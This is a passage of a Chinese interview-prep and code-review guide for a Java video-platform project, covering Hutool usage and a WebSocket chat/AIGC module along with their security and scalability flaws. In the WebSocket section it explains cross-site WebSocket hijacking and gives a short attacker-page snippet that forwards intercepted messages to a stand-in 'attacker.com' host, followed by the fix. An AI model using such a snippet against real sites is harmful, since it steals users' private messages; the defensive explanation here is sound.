| FastJSON 版本需持续关注漏洞 | `java/pom.xml:185` 2.0.40 | 🟡 中 | 升级 + 统一到 Jackson |

---

## 第 16 章 Hutool —— 集成众多工具类

### 16.1 在这个项目里它扮演什么角色

**一句话**：Hutool 是这个项目的**工具类兜底库**，把「文件 IO、Base64、类型判断」这些琐碎代码从业务里挤出去。

**依赖**：`hutool-all` **5.8.16**（`java/pom.xml:328-332`），在 `video`、`user_center`、`common`、`gateway` 使用。

**项目里的实际使用点（全部列出，因为用得不多）**

| 位置 | 用到的类 | 用途 |
|---|---|---|
| `UploadAndEditServiceImpl:3` | `cn.hutool.core.codec.Base64` | **把截帧封面转 Base64** 存内存 map |
| `UploadAndEditServiceImpl:4` | `cn.hutool.core.io.FileTypeUtil` | 判断文件真实类型（**检测恶意文件的那段是注释掉的**） |
| `UploadAndEditServiceImpl:5` | `cn.hutool.core.io.IoUtil` | `IoUtil.readBytes(inputStream)` 一次性读流 |
| `common/client/file/CustomMultipartFile.java:3` | `cn.hutool.core.io.IoUtil` | 读流包装成 `MultipartFile` |

**典型代码**：
```java
// 封面转 Base64（UploadAndEditServiceImpl）
InputStream inputStream = new FileInputStream(coverFile);
String cover = Base64.encode(IoUtil.readBytes(inputStream));

// 读缓冲区字节（抽帧前）
byte[] bytes = IoUtil.readBytes(uploadPartRequest.getFile().getInputStream());
```
对比原生写法：
```java
// 原生 Base64（需要处理 padding、URL-safe 变体、换行等细节）
String cover = java.util.Base64.getEncoder().encodeToString(bytes);
// 原生读流
ByteArrayOutputStream bos = new ByteArrayOutputStream();
byte[] buf = new byte[8192]; int n;
while ((n = in.read(buf)) != -1) bos.write(buf, 0, n);
byte[] bytes = bos.toByteArray();
```

### 16.2 高频问答

**Q1 [必答] 为什么要用 Hutool？它解决了什么问题？**

- **答**（三段）：
  - **① 解决什么**：Java 标准库对**日常琐碎操作**的支持很笨重。举我项目里的实际例子：
    - **读一个 InputStream 的全部字节**：JDK 9 才有 `readAllBytes()`，而我项目是 **JDK 8**，原生写法要 5 行循环；`IoUtil.readBytes(in)` **一行**。
    - **Base64 编码**：JDK 8 虽有 `java.util.Base64`，但 Hutool 的 `Base64.encode` 还统一了 URL-safe 变体、MIME 换行等场景的 API。
    - **判断文件真实类型（magic number）**：`FileTypeUtil.getType(file)` 读文件头判断，**不用看扩展名**——这是「防御伪装扩展名的恶意文件上传」的关键手段，JDK 完全没有。
  - **② Hutool 的定位和核心模块**（要能说出模块划分，显得真用过）：
    | 模块 | 常用类 | 用途 |
    |---|---|---|
    | `hutool-core` | `StrUtil`、`CollUtil`、`BeanUtil`、`DateUtil`、`IdUtil` | 判断空、集合操作、Bean 拷贝、日期格式化 |
    | `hutool-io` | `IoUtil`、`FileUtil`、`FileTypeUtil` | 流/文件读写、类型判断 |
    | `hutool-crypto` | `DigestUtil`、`SecureUtil`、`SymmetricCrypto` | 摘要、AES/RSA、HMAC |
    | `hutool-http` | `HttpUtil`、`HttpRequest` | 轻量 HTTP 客户端（**项目里没用，用的是 OkHttp/Apache HttpClient**） |
    | `hutool-json` | `JSONUtil` | JSON（**项目里没用，用的是 Gson/FastJSON**） |
    | `hutool-jwt` | `JWTUtil` | JWT（**项目里没用，用的是 jjwt**） |
    | `hutool-cache` | `CacheUtil`、`TimedCache` | 本地缓存 |
    | `hutool-excel` | `ExcelWriter`/`ExcelReader` | Excel 导入导出（**项目里没用**） |
  - **③ 为什么用它而不是自己写工具类**（**这是面试官真正想听的**）：
    - **省时间**：我项目里如果自己实现「读流」「Base64」「文件类型判断」，至少要多写 100 行代码和对应的测试。
    - **边界情况处理**：`IoUtil.readBytes` 处理了流关闭、缓冲区大小、大文件内存；`FileTypeUtil` 内置了**几十种文件格式的魔数表**——自己写大概率只覆盖几种，而且容易漏。
    - **经过验证**：Hutool 是 GitHub 星标几十万的成熟库，比自己写的工具类更可靠。
  - **④ 代价与风险**（必须客观）：
    1. **🟠 `hutool-all` 是个大包**：把所有模块打成一个 jar（约 2-3MB），**引一个工具类就把整个库拉进来**。而且项目里只用了 3 个类（`Base64`/`FileTypeUtil`/`IoUtil`），**引入了 95% 用不到的东西**。正确做法是按需引子模块（如只引 `hutool-core` + `hutool-io`）。
    2. **🟠 工具类滥用会掩盖设计问题**：比如 `BeanUtil.copyProperties` 到处用会让「对象转换」这件事变得隐式，字段名对不上时静默不拷贝，出 bug 很难查（我项目里 `NormalizeVideoDocument` 那个字段名不一致的 bug 就是同类问题）。
    3. **🟡 与项目已有能力重叠**：项目里已经有 Gson/FastJSON（JSON）、jjwt（JWT）、OkHttp（HTTP），所以 **Hutool 的对应模块完全没用**——这种"能力重叠"是技术栈膨胀的典型症状。
    4. **🟡 版本安全**：Hutool 历史上有过几个高危漏洞（如 `CVE-2023-24162` 影响 `XMLUtil` 反序列化、`CVE-2023-24163` 影响 `StrUtil`）。引第三方工具库要纳入**依赖漏洞扫描**。
  - **加分句**：**「Hutool 的价值是『把 100 行的琐碎代码压成 1 行』，它的风险是『让人忘记这些琐碎代码背后有边界情况』。所以我的用法是：只在『标准库确实很笨重且 Hutool 有成熟实现』的地方用它（IO、文件类型、加密摘要），业务对象转换这类东西我倾向显式写，不用 `BeanUtil` 黑盒拷贝。」**

**Q2 [进阶] 你项目里 Hutool 用得最多的地方是什么？有什么问题？**

- **答**（**结合真实代码讲，并且主动暴露一个"没做完"的功能**）：
  - **用得最多的三处**：
    1. **`IoUtil.readBytes(in)` 读分片字节**（`UploadAndEditServiceImpl:299`）：
       ```java
       InputStream videoFileInputStream = uploadPartRequest.getFile().getInputStream();
       byte[] bytes = IoUtil.readBytes(videoFileInputStream);
       ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
       ```
       **⚠️ 这里有个设计问题**：这是**为了抽第一帧封面**而把整个分片（6MB）**全读进内存**，然后再写成临时文件，再交给 jave 抽帧。**内存里同时存在 `byte[]` + `ByteArrayInputStream` + 磁盘临时文件三份数据**。更好的做法是**直接把 `MultipartFile.getInputStream()` 交给 `Files.copy(in, path)`**（流式写盘，不经过 byte[]），或者 jave 支持直接读流/临时文件路径。**这是典型的「为了用工具类而多绕一圈」**。
    2. **`Base64.encode` 编码封面**（`:314`）：编码后**存在静态内存 Map 里**（`uploadPart.setCover(cover)`），等到合并完成才返回前端。**一张 1920×1080 的 JPEG Base64 大概几百 KB~1MB，多个并发上传就会堆积**（这与第 10 章的内存泄漏问题同源）。**正确做法是抽帧后立刻传到 MinIO 的 `video-cover` bucket，只把对象名存起来。**
    3. **`FileTypeUtil` 检测文件类型**（`:4` import，`:289` 使用）：**⚠️ 这段代码是注释掉的！**
       ```java
       //        if(uploadPartRequest.getResumableChunkNumber()==1){
       //            ...
       //            if (!FileTypeUtil.getType(file).equals("mp4")) {
       //                file.delete();
       //                return Result.error("上传恶意文件");
       //            } else {
       //                file.delete();
       //                log.info("文件无问题");
       //            }
       //        }
       ```
       **这是项目里一个明确的"安全功能做了一半被注释掉"**：原本要在第一个分片到达时**用魔数校验文件真实类型**，防止上传伪装成 mp4 的恶意文件（如 JSP、PHP、可执行文件——虽然存到 MinIO 不直接执行，但如果将来有下载/转码环节就可能被利用）。**这段代码被注释掉了，意味着文件上传没有任何类型校验**。
       - **为什么被注释掉**（推测）：可能是因为**异步分片上传时第一个分片到达的顺序不保证**（`resumableChunkNumber==1` 不一定最先到），或者 `Files.copy` + `FileTypeUtil` 那段有 bug（它 `Files.copy` 到 `file.getAbsolutePath()`，但 `file` 是 `new File(path, "test")` **并没有创建父目录**，可能报 `NoSuchFileException`），作者调试不通就注释了。
       - **正确做法**：
         ```java
         // 在「合并完成、落库之前」统一校验一次最终文件（比校验分片更合理）
         String type = FileTypeUtil.getType(videoFile);
         if (!Set.of("mp4", "flv", "mov", "avi", "mkv").contains(type)) {
             minioService.removeObject(videoName);        // 清理已合并的对象
             return Result.error("不支持的文件类型");
         }
         ```
         **并且要在文件大小、时长上加限制**（防止上传 100GB 文件或超长视频拖垮转码）。
  - **这一节的面试价值**：**「一个被注释掉的恶意文件校验」是一个极好的主动暴露点**——它同时展示了：① 我读过自己的代码；② 我知道文件上传安全检查该怎么做；③ 我能推断出当时为什么注释掉（分片顺序不保证）；④ 我能给出更合理的落点（合并后统一校验而不是校验分片）。**这比说「我用了 Hutool」有价值得多。**

### 16.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **恶意文件类型校验被注释掉，上传无类型校验** | `UploadAndEditServiceImpl:289-296` | 🔴 致命 | 合并后统一用 `FileTypeUtil` 校验 + 大小/时长限制 |
| **`hutool-all` 全量引入，只用 3 个类** | `java/pom.xml:328-332` | 🟡 中 | 按需引 `hutool-core`/`hutool-io` |
| 封面 Base64 常驻内存 Map | `UploadAndEditServiceImpl:314-321` | 🟠 高 | 抽帧后直传 MinIO |
| 读 6MB 分片进 byte[] 再写盘（三份数据） | `UploadAndEditServiceImpl:298-307` | 🟡 中 | `Files.copy(in, path)` 流式写盘 |
| Hutool 模块与 Gson/jjwt/OkHttp 能力重叠 | 全项目 | 🟢 低 | 明确各库边界 |
| 无依赖漏洞扫描 | 无配置 | 🟡 中 | 接 OWASP Dependency-Check / Trivy |

---

## 第 17 章 WebSocket —— 实时长连接

### 17.1 在这个项目里它扮演什么角色

**一句话**：WebSocket 是这个项目里**唯一的长连接通道**，同时承载**两件业务**：**一对一实时私聊**和**AIGC 流式对话**（文生文）。

**核心配置**（`chat/config/WebSocketConfig.java`）
```java
@Configuration
@EnableWebSocket
public class WebSocketConfig implements WebSocketConfigurer {
    @Resource WebSocketHandler webSocketHandler;
    @Override
    public void registerWebSocketHandlers(WebSocketHandlerRegistry registry) {
        registry.addHandler(webSocketHandler, "/ljl/bilibili/chat")   // 端点路径
                .setAllowedOrigins("*");                              // ⚠️ 允许所有来源
    }
}
```

**一张图讲清寻址机制（必须背下来）**

```
                     ┌─────────────────────────────────────────┐
   浏览器 A ──ws──> │  chat 服务（1688）                        │
                     │                                          │
                     │  WEB_SOCKET_SESSION_CONCURRENT_MAP        │
                     │    wsSessionId  ──>  WebSocketSession     │  ← 「连接在哪」
                     │                                          │
                     │  USERID_TO_SESSIONID_MAP                  │
                     │    userId       ──>  wsSessionId          │  ← 「人对应哪条连接」
                     │                                          │
                     │  BIGMODEL_MAP                             │
                     │    userId       ──>  BigModelHandler      │  ← 「人的 AI 上下文」
                     └─────────────────────────────────────────┘
                                      ▲
   浏览器 B ──ws────────────────────────┘
```

**消息协议（4 种 type，双向都用）**

| 方向 | type | 载荷 | 作用 |
|---|---|---|---|
| 后端 → 前端 | `sessionId` | `sessionId` | 连接建立时下发服务器侧会话 id |
| 前端 → 后端 | `init` | `userId`、`sessionId` | 注册两张映射表 |
| 前端 → 后端 | `message` | `receiverId`、`content` | 私聊（在线直推 / 离线落库） |
| 前端 → 后端 | `bigmodel` | `question`、`userId` | 问大模型 |
| 后端 → 前端 | `bigmodel` | `status`、`content` | 大模型流式帧（0 首 / 1 中 / 2 末） |
| 前端 → 后端 | `removeSession` | `userId` | 清空 AI 会话上下文 |

### 17.2 高频问答

**Q1 [必答] 为什么用 WebSocket？HTTP 轮询不行吗？**

- **答**（三段）：
  - **① 项目里解决什么**：两个场景都是「**服务器主动推**」：
    - **私聊**：A 发消息给 B，**B 必须立刻看到**。用 HTTP 的话 B 的浏览器不知道有新消息，只能不停问服务器「有我的消息吗」。
    - **AIGC 流式输出**：大模型一次回答要 5-15 秒，后端拿到的是**几十个增量帧**，需要**边生成边推**给用户（首字延迟从 10 秒降到 1 秒）。
  - **② 为什么不是别的方案**（**这题一定要把三种方案对比讲清，是经典八股**）：
    | 方案 | 原理 | 实时性 | 开销 | 我为什么不用 |
    |---|---|---|---|---|
    | **短轮询** | 客户端每 N 秒问一次 | 差（延迟 = 轮询间隔） | **高**（大量空请求，N 个用户 = N/秒 QPS 全是无效请求） | 实时性差且浪费带宽 |
    | **长轮询** | 请求挂住直到有数据或超时 | 好 | 中（每次推送都要重建 HTTP 连接） | 每次推送一次握手成本；Tomcat 线程被挂住的请求占满 |
    | **SSE（Server-Sent Events）** | 单向流式推送，走 HTTP | **好** | **低** | **只支持服务端→客户端单向**，私聊需要双向；而且**星火云侧只提供 WebSocket 接口** |
    | **WebSocket** | 一次握手升级协议，全双工 | **最好** | **最低**（无重复握手，帧头仅 2-10 字节） | **选它** |
  - **③ 为什么 WebSocket 开销低**：一次 HTTP 握手（Upgrade 协商）后就**不再有 HTTP 头**（每次 HTTP 请求要带几百字节 header，WebSocket 数据帧头只有 2-10 字节）；全双工；服务端可以主动发。
  - **④ 代价**（**必须讲，这是有含量的部分**）：
    1. **🔴 有状态**：WebSocket 连接**绑在某个服务实例的内存里**，所以 chat 服务**无法水平扩容**——用户 A 连在实例 1，用户 B 连在实例 2，A 发给 B 的消息在实例 1 里**找不到 B 的连接**。要解决要么用**粘性会话**（同一个用户永远路由到同一实例），要么用 **Redis Pub/Sub / MQ 做跨实例广播**。**这是我项目里没解决的问题**（见 Q4）。
    2. **🔴 长连接穿透中间件是难点**：Nginx 要转发 `Upgrade`/`Connection` 头并放宽 `proxy_read_timeout`（默认 60 秒空闲断开）；网关要配置 `ws://` 路由；云厂商 LB 的空闲超时也要调。
    3. **🟠 没有自动重连和心跳**：WebSocket 协议本身**不带心跳**（不像 TCP KeepAlive 默认 2 小时），中间设备（Nginx、防火墙、云 LB）会静默断开空闲连接，**客户端需要自己发 ping/pong 保活**。我项目里前端 `onclose` 只打日志，**没有重连**。
    4. **🟠 消息可靠性要自己做**：WebSocket 不保证消息送达（连接断了推的消息就丢了），需要**客户端确认（ACK）+ 服务端重推 + 离线消息落库**。我项目里只做了「离线落库」，**没有 ACK 和重推**。

**Q2 [必答] 你的 WebSocket 怎么区分私聊和 AIGC 消息？**

- **答**：
  - **协议设计**：消息体里带 `type` 字段，后端 `switch (type)` 分发（`WebSocketHandler.handleTextMessage`）：
    ```java
    String type = json.get(MESSAGE_TYPE).getAsString();
    switch (type) {
        case "bigmodel":       // 转发给大模型
        case "init":           // 注册两张映射表
        case "message":        // 私聊转发/离线落库
        case "removeSession":  // 清空 AI 上下文
    }
    ```
  - **为什么用一个端点跑两种业务**（**这是面试官必问的架构问题**）：
    1. **基础设施完全重合**：两者都是「长连接 + 消息推送到人」，复用**同一套 `WebSocketHandler`、同一套 `userId↔sessionId` 寻址表**；
    2. **AIGC 的结果本身就要落进聊天记录**（虚拟好友「星火 API」），拆开反而要跨服务写库；
    3. **浏览器端一个连接就够了**：多开连接会**成倍消耗服务端 session 与文件描述符**（`ConcurrentHashMap` 里每个连接占一个 entry，还有 Netty/Tomcat 的会话对象）；
    4. 私聊和 AI 回复都要推给**同一个人**，共用一条连接天然复用寻址表。
  - **代价（要主动说）**：**职责耦合**——两者 **SLA 完全不同**（私聊要 200ms 内送达，AIGC 首帧 1-2 秒也能忍），却在同一个 Handler、同一个线程池里。**如果并发上来，AIGC 应该独立部署并单独限流**，因为大模型的慢请求会拖累私聊的实时性。项目文档里我记了这个判断。
  - **追问预警：为什么不用两个端点？** 答：技术上可行（`registry.addHandler(handler1, "/chat").addHandler(handler2, "/aigc")`），但会**成倍增加连接数和映射表条目**，而收益只是"代码上分开"。**更好的解耦方式不是拆端点，而是拆「处理器」**——一个端点、两个 Handler 职责类，用 type 路由过去。

**Q3 [深挖] 你的 WebSocket 身份认证是怎么做的？**

- **考点**：**这是本章最严重的漏洞，必须主动讲。**

- **答**：
  - **现状（必须坦诚）**：**身份完全由前端决定**。
    ```java
    // WebSocketHandler:83-89  init 消息
    String sessionId = json.get(MESSAGE_TYPE_SESSIONID).getAsString();
    String userId     = json.get(USER_IDENTITY).getAsString();
    USERID_TO_SESSIONID_MAP.put(userId, sessionId);      // ← 无条件信任前端传的 userId
    WEB_SOCKET_SESSION_CONCURRENT_MAP.put(sessionId, session);
    ```
    **任何人在浏览器控制台把 `userId` 改成别人的 id，就能：**
    1. **以他人身份发消息**（私聊伪造）；
    2. **读到别人的 AI 对话上下文**（因为 `BIGMODEL_MAP` 是按前端传来的 `userId` 索引的）；
    3. **冒充任何人在线**（`USERID_TO_SESSIONID_MAP.put` 会覆盖真实用户的映射，**把真实用户挤掉**——这是「顶号攻击」）。
  - **为什么这么写**（诚实说原因）：WebSocket 握手**不能自定义请求头**（浏览器 `new WebSocket(url)` API 限制），我**没法像 HTTP 那样把 `shortAuthorization` 头带上去**，当时就干脆让前端在 `init` 消息里报 userId。**这是典型的「绕不过去就先不校验」，属于鉴权覆盖不全。**
  - **正确做法（完整方案）**：
    ```java
    // 1. 前端握手时把 token 放在 URL query 上（或用 Cookie）
    const ws = new WebSocket(`ws://host/ljl/bilibili/chat?token=${shortToken}`);
    
    // 2. 后端用 HandshakeInterceptor 在握手阶段校验，把 userId 绑到 session attributes
    @Component
    public class AuthHandshakeInterceptor implements HandshakeInterceptor {
        @Override
        public boolean beforeHandshake(ServerHttpRequest req, ServerHttpResponse resp,
                                       WebSocketHandler h, Map<String,Object> attrs) {
            String token = UriComponentsBuilder.fromUri(req.getURI()).build()
                    .getQueryParams().getFirst("token");
            if (token == null) { resp.setStatusCode(HttpStatus.UNAUTHORIZED); return false; }
            try {
                Claims c = JwtUtil.getClaimsFromToken(token);       // 验签 + 验过期
                attrs.put("userId", c.get("userId", Integer.class)); // ★ 绑定到会话
                return true;
            } catch (Exception e) { resp.setStatusCode(HttpStatus.UNAUTHORIZED); return false; }
        }
        // afterHandshake...
    }
    
    // 3. 后续所有消息的身份一律从会话取，彻底不信客户端
    Integer userId = (Integer) session.getAttributes().get("userId");
    ```
    **关键点**：`session.getAttributes()` 是**服务端侧**的存储，客户端**无法篡改**——这才是有意义的身份绑定。
  - **加分句**：**「WebSocket 的鉴权必须放在『握手阶段』，因为那是唯一一次带 HTTP 语义的机会。握手之后就是纯帧通信了，没有 header 也没有 Cookie，你只能信任自己绑定在 session 上的东西。我项目里网关已经有 JWT 鉴权，但 WebSocket 这条路绕过了它——这是『鉴权覆盖不全』的典型问题，也是我复盘时列的第一优先级修复项。」**

**Q4 [深挖] 你的 WebSocket 还有哪些问题？**

- **答**（逐条，按严重度，**每条都要给出后果和修法**）：

  1. **🔴 `setAllowedOrigins("*")` → 跨站 WebSocket 劫持（CSWSH）**
     - **问题**：允许任意域名的页面连我的 WebSocket。**浏览器的同源策略不会限制 WebSocket 连接**，所以恶意页面可以：
       ```javascript
       // 攻击者网站上的代码
       const ws = new WebSocket("wss://labilibili.com/ljl/bilibili/chat");
       ws.onmessage = e => fetch("https://attacker.com/steal?data=" + e.data);
       ```
       如果用户已登录（带了 Cookie），攻击者就能**窃取消息流**。
     - **修法**：改成白名单 `setAllowedOrigins("https://labilibili.com")`；或实现 `OriginHandshakeInterceptor` 校验 `Origin` 头；**或（更好）在握手时校验 JWT**（有了鉴权，Origin 就不再是唯一防线）。
  
  2. **🔴 无法水平扩容（有状态）**
     - **问题**：映射表是**进程内的静态 `ConcurrentHashMap`**。chat 起两个副本时：用户 A 连实例 1、用户 B 连实例 2，A 发给 B 的消息在实例 1 里查 `USERID_TO_SESSIONID_MAP` **查不到 B** → 走离线落库分支 → **B 明明在线却收不到实时消息**，只能刷新页面拉历史。
     - **修法**（三种，按成本）：
       - **粘性会话（sticky session）**：网关按 `userId` hash 路由到固定实例。简单，但扩容/重启时会有一批用户重连，且有热点。
       - **✅ Redis Pub/Sub 广播**：每个实例订阅 `ws:broadcast` 频道，推送时 `PUBLISH` 消息，**所有实例收到后各自检查「这个 userId 在我这吗」，在就推，不在就忽略**。这是最常用的方案。
       - **MQ 广播**：用 RocketMQ 的广播模式（`MessageModel.BROADCASTING`），效果同上但更重。
       - **更彻底的方案**：把连接状态交给**专门的网关层/连接层**（如 Netty 独立部署 + 一致性哈希），业务服务通过它推送。
  
  3. **🔴 `BIGMODEL_MAP` 只增不减 → 内存泄漏**
     - **问题**：`BIGMODEL_MAP.put(id, handler)` 之后**没有任何地方 remove**。`removeSession` 消息只调了 `handler.removeSession()`（清 `historyList`），**map 里的 entry 还在**；`afterConnectionClosed` 也只清了两张映射表。每个 entry 里装着 `historyList`（**最多 12000 字符**）。用户量一上来就是**稳定增长的内存占用**，最终 OOM。
     - **修法**：连接关闭/超时后 `BIGMODEL_MAP.remove(userId)`；或换成 **Caffeine/Redis 带 TTL 的缓存**（比如 30 分钟不活跃就淘汰）；或把上下文**外置到 Redis**（这同时解决了多实例问题）。
  
  4. **🔴 上下文放内存 → 多实例失效 + 重启失忆**
     - **问题**：`BigModelHandler.historyList` 是**进程内 `ArrayList`**。① 多实例时用户请求被负载均衡到不同实例，**上下文一半在一半在二**，模型表现随机变差；② **发布一次全丢**。
     - **修法**：上下文外置到 Redis：
       ```
       key: chat:ctx:{userId}      类型: List      内容: [{role, content}, ...]
       写入: RPUSH + LTRIM（保留最近 N 轮）
       读取: LRANGE
       过期: EXPIRE 30 分钟（滑动续期）
       ```
       这样多实例共享、重启不丢，还能顺手做「上下文长度」的可观测。
  
  5. **🟠 `afterConnectionClosed` 里遍历 Map 时 remove**
     ```java
     for (Map.Entry<String,String> entry : USERID_TO_SESSIONID_MAP.entrySet()) {
         if (entry.getValue().equals(session.getId())) {
             USERID_TO_SESSIONID_MAP.remove(entry.getKey());     // ← 遍历中删除
         }
     }
     ```
     - **不会抛 `ConcurrentModificationException`**（因为是 `ConcurrentHashMap`，迭代器弱一致），**但有两个真问题**：① 弱一致遍历在多个连接同时关闭时**可能漏删**；② **更严重的是「一个用户多标签页」场景**——`USERID_TO_SESSIONID_MAP` 是 `userId → 单个 sessionId` 的**一对一映射**，用户开两个标签页时后连接的会**覆盖**先连接的映射，此时关闭任意一个标签页，就会**把另一个还活着的连接也删掉**（老连接变成「幽灵连接」，还占着资源但收不到消息）。
     - **修法**：`userId → Set<sessionId>` 一对多，推送时遍历所有在线端；删除时只移除当前 sessionId；用 `entrySet().removeIf(...)`。
  
  6. **🟠 长消息会被容器拒绝**：Spring 的 Tomcat WebSocket 容器默认单条文本消息缓冲区（`maxTextMessageBufferSize`）约 **8KB**，超了会断连报 `1009 Message too big`。而我推的是**整段 Markdown 的 AI 回复**（PPT 级文案可能几 KB 到几十 KB）。**修法**：配 `ServletServerContainerFactoryBean` 调大 `maxTextMessageBufferSize` / `maxSessionIdleTimeout`，或改成分片推送。
  
  7. **🟠 无心跳保活**：Nginx 默认 60 秒空闲断连，用户发呆一分钟连接就没了，而且**前端不重连**。修法：前端每 30 秒发一次 ping，或后端定时发心跳；`maxSessionIdleTimeout` 设为心跳间隔的 2-3 倍。
  
  8. **🟡 无消息可靠性**：推送失败（连接已断）时 `sendMessage` 抛 `IOException`，代码里 `catch` 后 `throw new RuntimeException(e)`，被外层吞掉只打日志。**消息既没重试也没落库**（对私聊来说就等于丢了）。修法：捕获后判定会话失效 → 主动 `close` + 从映射表移除 + **把消息落库为离线消息**。
  
  9. **🟡 `WebSocketHandler.handleMessageEvent` 上标了 `@Async` 但 `@EnableAsync` 被注释掉**
     - **这题很隐蔽但极有说服力**（见 Q5）。

**Q5 [深挖] `@Async` 在你项目里生效了吗？**

- **考点**：**这题是"读懂自己代码"的顶级追问，答出来基本能拿下这场面试。**

- **答**：
  - **没有生效。**
    ```java
    // chat/config/AsyncConfig.java
    @Configuration
    //@EnableAsync(proxyTargetClass = true)      // ← 关键注解被注释掉了！
    public class AsyncConfig {
        // 里面全是注释掉的线程池配置草稿
    }
    
    // chat/handler/WebSocketHandler.java
    @EventListener
    @Async                                        // ← 依赖 @EnableAsync 才生效
    public void handleMessageEvent(MessageEvent event) throws IOException { ... }
    ```
    **`@Async` 的生效前提是容器里存在 `@EnableAsync`**（它负责注册 `AsyncAnnotationBeanPostProcessor`）。我把 `@EnableAsync` 注释掉了，所以 `@Async` **只是一个没有任何作用的注解**，`handleMessageEvent` 实际上在**发布事件的线程上同步执行**。
  - **后果**：事件发布发生在 **OkHttp 的 WebSocket 回调线程**上（`BigModelHandler.onMessage` → `applicationEventPublisher.publishEvent`）。所以：
    1. **一次 `sendMessage` 阻塞会拖住整条星火连接的帧解析**——比如某个浏览器连接网络慢，`sendMessage` 阻塞，**后续所有帧（包括其他用户的）都排在后面**，吞吐下降；
    2. Spring Event 的解耦**只是看起来解耦**——事件总线默认同步，异步化必须自己配线程池。
  - **顺带讲清那个「为什么用 Spring Event」的设计**（体现架构思考）：
    ```java
    // BigModelHandler 是 new 出来的，不是 Spring Bean，拿不到 WebSocketSession 那套依赖
    public class BigModelHandler extends WebSocketListener {
        private ApplicationEventPublisher applicationEventPublisher;   // 构造注入
        public BigModelHandler(ApplicationEventPublisher p) { this.applicationEventPublisher = p; }
    }
    ```
    `BigModelHandler` 继承 OkHttp 的 `WebSocketListener`，是**手动 `new` 的**，所以拿不到容器里的 Bean。通过**构造注入 `ApplicationEventPublisher`** 把响应「抛」回容器，由 `WebSocketHandler`（Spring Bean）监听并推送——**收益是解耦，代价是多一层 + 事件是字符串传递（`gson.fromJson` 再解析一遍，有序列化开销）**。
    - **更直接的做法**：把推送封装成一个 Spring Bean 的**静态引用**（`ApplicationContextAware` 或 `@PostConstruct` 里把 Bean 存到静态字段），或抽一个 `MessagePusher` 单例注入。
    - **⚠️ 而且注意**：`MessageEvent` 这条路实际上**已被弃用**——`BigModelHandler.onMessage` 里发布事件的代码**是注释掉的**，现在直接调用 `WEB_SOCKET_SESSION_CONCURRENT_MAP.get(...).sendMessage(...)`（`:123`）。所以**`WebSocketHandler.handleMessageEvent` 现在是一个死方法**（没人发布事件了）。当前唯一的监听者收不到任何事件——**这是个很好的「代码演进残留」例子，说明我重构过但没清理干净。**
  - **正确配置**（要能写出来）：
    ```java
    @Configuration
    @EnableAsync
    public class AsyncConfig implements AsyncConfigurer {
        @Bean("wsExecutor")
        public Executor wsExecutor() {
            ThreadPoolTaskExecutor ex = new ThreadPoolTaskExecutor();
            ex.setCorePoolSize(8);
            ex.setMaxPoolSize(32);
            ex.setQueueCapacity(1000);
            ex.setThreadNamePrefix("ws-push-");                          // ★ 便于排查
            ex.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());  // ★ 有界队列 + 明确拒绝策略
            ex.initialize();
            return ex;
        }
        @Override
        public AsyncUncaughtExceptionHandler getAsyncUncaughtExceptionHandler() {
            return (ex, method, params) -> log.error("async error: {}", method.getName(), ex);
        }
    }
    // 使用时要指定池名，别用默认
    @Async("wsExecutor")
    public void handleMessageEvent(MessageEvent event) { ... }
    ```
    - **为什么要显式配池**：不配的话 `@Async` 用 `SimpleAsyncTaskExecutor`——**它每次都新建线程，没有池化**（这是个经典陷阱，会导致线程数爆炸）。
    - **为什么拒绝策略要显式**：默认 `AbortPolicy` 会抛 `RejectedExecutionException`，推送失败静默；`CallerRunsPolicy` 会让调用方（OkHttp 线程）自己执行，形成**天然背压**，比丢弃更安全。

**Q6 [进阶] 如果 QPS 涨 100 倍，这个模块哪里先炸？**

- **答**（**按顺序，展示「瓶颈定位」能力**）：
  1. **最先炸：`getPPT` / `getImage` 的同步阻塞把 Tomcat 线程池占满**。`ChatController.getImage` 是同步 HTTP（一次生图 5-15 秒），Tomcat 默认 200 线程，**200 个并发就把 chat 服务打满**，而且会**连带私聊一起挂**（同一个 Tomcat）。
  2. **然后：星火 API 配额打满 + 429 雪崩**。没有熔断和限流，失败请求会堆积重试（而且我 `onFailure` 里有 `System.exit(0)` 的致命写法，见下方警告）。
  3. **然后：`BIGMODEL_MAP` 内存持续增长 → OOM**（只增不减 + 每个 entry 最多 12000 字符）。
  4. **然后：单实例内存态上下文在扩容后随机失效**，用户体验断崖（同一个用户上下文时有时无）。
  5. **对应的解法正好就是 Q4 的重构清单**：上下文外置 Redis → 生图/PPT 异步化 → 全局限流熔断 → 推送链路跨实例广播。
  
  > **⚠️ 顺带必须讲的一个致命写法**：`BigModelHandler.onFailure` 和 `PPTHandler.onFailure` 里有：
  > ```java
  > if (101 != code) {
  >     System.out.println("connection failed");
  >     System.exit(0);        // ← 🔴 一次外部抖动杀死整个服务进程！
  > }
  > ```
  > **星火侧一次网络抖动、限流 429、鉴权失败，就会把整个 chat 服务的 JVM 干掉。** 这是**可用性灾难**，优先级高于所有代码风格问题。正确做法：关闭当前 WebSocket → 错误分类（可重试的 429/超时 vs 不可重试的 401）→ 记录指标 → 给用户可读的错误气泡 → 退避重试。**这是我从 demo 抄进来的地雷，也是我复盘列的第一条。**

### 17.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **身份完全由前端传 `userId` 决定** | `WebSocketHandler:83-89` | 🔴 致命 | `HandshakeInterceptor` 握手校验 JWT + `session.getAttributes()` |
| **`onFailure` 里 `System.exit(0)` 杀进程** | `BigModelHandler:165`、`PPTHandler` | 🔴 致命 | 错误分类 + 退避重试 + 降级气泡 |
| **`setAllowedOrigins("*")` → CSWSH** | `WebSocketConfig:23` | 🔴 致命 | Origin 白名单 + 握手鉴权 |
| **静态映射表 → 无法水平扩容** | `WebSocketHandler:41-43` | 🔴 致命 | Redis Pub/Sub 广播 或 粘性会话 |
| **`BIGMODEL_MAP` 只增不减 → 内存泄漏** | `WebSocketHandler:43` | 🔴 致命 | `remove` / Caffeine TTL / 外置 Redis |
| **上下文存内存 → 多实例失效 + 重启失忆** | `BigModelHandler.historyList` | 🟠 高 | Redis List + LTRIM + TTL |
| **`@Async` 因 `@EnableAsync` 被注释而不生效** | `AsyncConfig:8` + `WebSocketHandler:48` | 🟠 高 | 打开 `@EnableAsync` + 显式线程池 |
| `handleMessageEvent` 已是死方法（事件没人发） | `WebSocketHandler:47-59` | 🟡 中 | 清理死代码或恢复事件机制 |
